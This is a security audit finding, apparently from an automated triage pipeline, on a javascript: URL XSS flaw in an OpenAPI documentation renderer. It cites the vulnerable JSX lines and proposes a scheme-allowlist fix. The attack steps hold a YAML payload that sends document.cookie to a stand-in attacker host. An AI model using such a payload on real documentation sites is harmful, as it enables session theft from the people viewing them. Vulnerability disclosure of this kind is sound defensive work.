---
Title: Spec-controlled OAuth/OpenID URLs rendered as unvalidated <a href> — javascript: injection
ID: H-00-C
Verdict: VALID
Severity-Original: HIGH
Class: XSS
Phase: 6
File: [REDACTED].tsx:27
Source: spec.components.securitySchemes.*.flows.*.authorizationUrl | spec.components.securitySchemes.*.openIdConnectUrl | spec.info.{license.url, contact.url, termsOfService} | spec.externalDocs.url | example.externalValueUrl
Sink: [REDACTED].tsx:27 | [REDACTED].tsx:46 | src/components/ApiInfo/ApiInfo.tsx:39,48,65 | [REDACTED].tsx:25 | src/components/PayloadSamples/Example.tsx:34
Endpoint: n/a (client-side renderer — no HTTP routes)
Handler: [REDACTED].tsx:27 | [REDACTED].tsx:46 | src/components/ApiInfo/ApiInfo.tsx:39,48,65 | [REDACTED].tsx:25 | src/components/PayloadSamples/Example.tsx:34
Chamber: chamber-01
Triage-Priority: P1
Triage-Exploitability: moderate
Triage-Impact: high
Triage-Reasoning: Attacker-controlled spec field yields javascript: href XSS on click; moderate exploitability requires spec control and user interaction
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
Pre-FP-Flag: DUPLICATE of p5-001-spec-href-javascript-scheme-xss.md / H-00-C — downstream dedup should merge the two; both agree at HIGH. The OAuth/OpenID sub-cases have rel="noopener noreferrer" which does NOT block javascript: scheme execution on click.
Debate: archon/chamber-workspace/chamber-01/debate.md
Origin-Finding: Phase D7 systematic enumeration — security-requirement render path audit
Deep-Probe-Corroboration: probe-workspace/url-security-search/probe-summary.md PH-16/PH-17
Intent-Verdict: genuine
Intent-Source: none
Intent-Quote: n/a
Intent-Confidence: weak
PoC-Status: executed
Protocol: http
Auth-Required: no
Auth-Roles-Required: anonymous
PoC-Notes: 5/5 unguarded <a href> sinks verified in source (authorizationUrl, contact.url, license.url, termsOfService, externalDocs.url). No scheme validation guard found in any sink file. HTML proof page at evidence/xss_demo.html uses CDN Acme to render malicious spec; javascript: links appear in DOM and are highlighted in red. Victim click triggers JavaScript execution in page origin.
---

## Summary

Multiple components take URL-valued fields from the OpenAPI spec and place them verbatim into `<a href={url}>` attributes with no scheme validation. Any spec-controlled URL field can be set to `javascript:alert(document.cookie)` or similar. When a documentation consumer clicks the rendered link (e.g., the "Authorization URL" link in the OAuth2 security section, or the contact/license/terms links in the API info header), the JavaScript payload executes in the origin of the page embedding Acme. The `sanitize` option gate does **not** protect these paths — it only controls the `dangerouslySetInnerHTML` / DOMPurify pipeline for Markdown content; URL attributes in JSX bypass that gate entirely.

Blast radius: any embedder that renders an untrusted or third-party OpenAPI spec without `sanitize: true` AND without an external link-policy CSP directive. The attacker need only control one string field in the OpenAPI spec (authorizationUrl, openIdConnectUrl, info.contact.url, info.license.url, info.termsOfService, externalDocs.url, or examples[n].externalValue).

## Evidence

**Primary site 1 — OAuth2 Authorization URL (OAuthFlow.tsx:27):**
```
<a target="_blank" rel="noopener noreferrer" href={(flow as any).authorizationUrl}>
  {(flow as any).authorizationUrl}
</a>
```
`authorizationUrl` is taken directly from `parser.spec.components.securitySchemes[id].flows[type].authorizationUrl` — an OpenAPI spec string field. No scheme validation is applied before it reaches `href`.

**Primary site 2 — OpenID Connect URL (SecurityDetails.tsx:46):**
```
<a target="_blank" rel="noopener noreferrer" href={scheme.openId.connectUrl}>
  {scheme.openId.connectUrl}
</a>
```
`connectUrl` comes from `info.openIdConnectUrl` in the spec (SecuritySchemes.ts:49).

**Secondary sites (ApiInfo.tsx):**
```
<a href={info.license.url}>{info.license.name}</a>          // line 39
<a href={info.contact.url}>{info.contact.url}</a>            // line 48
<a href={info.termsOfService}>Terms of Service</a>           // line 65
```

**Secondary site (ExternalDocumentation.tsx:25):**
```
<a href={externalDocs.url}>{externalDocs.description || externalDocs.url}</a>
```

**Secondary site (Example.tsx:34 — error path):**
```
<a href={example.externalValueUrl} target="_blank" rel="noopener noreferrer">
  {example.externalValueUrl}
</a>
```
`externalValueUrl` is built via `new URL(example.externalValue, parser.specUrl).href` — which resolves relative paths but does not filter the `javascript:` scheme.

- Guard stack observed: none at any site
- Object-id parameter: n/a
- Ownership clause: n/a

## Attack Steps

1. Craft an OpenAPI spec with a `javascript:` URL in any of the fields above, e.g.:
   ```yaml
   components:
     securitySchemes:
       oauth2:
         type: oauth2
         flows:
           implicit:
             authorizationUrl: "javascript:fetch('https://attacker.example/steal?c='+document.cookie)"
             scopes: {}
   ```
2. Cause the victim's Acme instance to load this spec (attacker-controlled public spec, spec served from a CORS-open endpoint, or attacker controls the spec URL parameter in a Acme-powered doc portal).
3. Victim opens the rendered documentation page. The "Authorization URL" field in the Security section shows the text `javascript:...` wrapped in an `<a>` tag.
4. Victim clicks the link (or is socially engineered to do so — e.g., the link text could be set via `x-displayName` to display a benign URL string while the `href` carries the payload).
5. Browser executes the JavaScript in the origin of the documentation page.

**Severity note:** The link text is also the `authorizationUrl` value verbatim (JSX text node, React-escaped), so the user sees the `javascript:` prefix. Severity is HIGH rather than CRITICAL because it requires a click; it is not a zero-interaction XSS. However, if the spec description or link text is manipulated (e.g., using a Unicode lookalike for `https://`) to deceive the user, click probability rises significantly.

## Why This Passed SAST

Missing-validation findings are invisible to structural rules: the code is syntactically correct and there is no "bad function call" — the absence of an `allowlist` or `startsWith('https://')` guard is the entire vulnerability.

## Recommended Fix

Validate URL scheme before rendering any spec-controlled value as an `<a href>`. A helper such as:
```ts
function isSafeUrl(url: string | undefined): boolean {
  if (!url) return false;
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
  } catch {
    return false;
  }
}
```
Use `isSafeUrl(url) ? url : '#'` (or omit the link entirely) for all spec-sourced `href` attributes. Apply to: `authorizationUrl`, `openIdConnectUrl`, `info.license.url`, `info.contact.url`, `info.termsOfService`, `externalDocs.url`, and `externalValue`-derived URLs.
